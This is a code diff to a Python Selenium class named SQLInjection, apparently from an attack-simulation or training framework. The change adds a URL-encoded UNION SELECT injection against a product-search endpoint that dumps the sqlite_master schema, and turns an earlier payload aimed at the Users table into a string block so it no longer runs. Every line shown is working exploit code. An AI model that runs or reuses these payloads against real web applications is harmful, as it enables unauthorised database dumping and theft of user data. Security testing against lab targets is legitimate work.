@@ -53,6 +53,9 @@ class SQLInjection(Attack):
     def run_tryhard(self):
         driver = webdriver.Chrome(options=self.chrome_options)
         driver.delete_all_cookies()
+        driver.get(self.base_url + "/rest/products/search?q=qwert%27%29%29%20UNION%20SELECT%20sql%2C%20%272%27%2C%20%273%27%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%27%2C%20%278%27%2C%20%279%27%20FROM%20sqlite_master--")
+        time.sleep(4)
+        """
         driver.get(self.base_url)
         time.sleep(2)
         driver.get(self.base_url + "/rest/products/search?q=")
@@ -87,6 +90,7 @@ class SQLInjection(Attack):
                    "rd%2C%20%274%27%2C%20%275%27%2C%20%276%27%2C%20%277%2"
                    "7%2C%20%278%27%2C%20%279%27%20FROM%20Users--")
         time.sleep(2)
+        """
         driver.quit()
 
 
